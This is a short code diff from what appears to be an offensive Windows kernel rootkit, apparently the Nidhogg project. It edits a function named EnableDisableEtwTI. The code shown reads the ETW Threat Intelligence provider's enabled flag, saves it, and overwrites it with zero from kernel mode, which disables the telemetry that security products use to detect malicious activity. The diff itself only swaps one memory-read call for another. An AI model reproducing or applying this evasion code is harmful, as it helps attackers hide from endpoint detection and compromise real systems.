@@ -106,7 +106,7 @@ NTSTATUS AntiAnalysis::EnableDisableEtwTI(bool enable) {
 	}
 	else {
 		ULONG disableEtw = 0;
-		status = NidhoggMemoryUtils->KeReadProcessMemory(PsGetCurrentProcess(), &enableProviderInfo->IsEnabled, &this->PrevEtwTiValue, sizeof(ULONG), KernelMode);
+		status = ReadProcessMemory(PsGetCurrentProcess(), &enableProviderInfo->IsEnabled, &this->PrevEtwTiValue, sizeof(ULONG), KernelMode);
 
 		if (NT_SUCCESS(status))
 			status = MmCopyVirtualMemory(PsGetCurrentProcess(), &disableEtw, PsGetCurrentProcess(), &enableProviderInfo->IsEnabled, sizeof(ULONG), KernelMode, &bytesWritten);
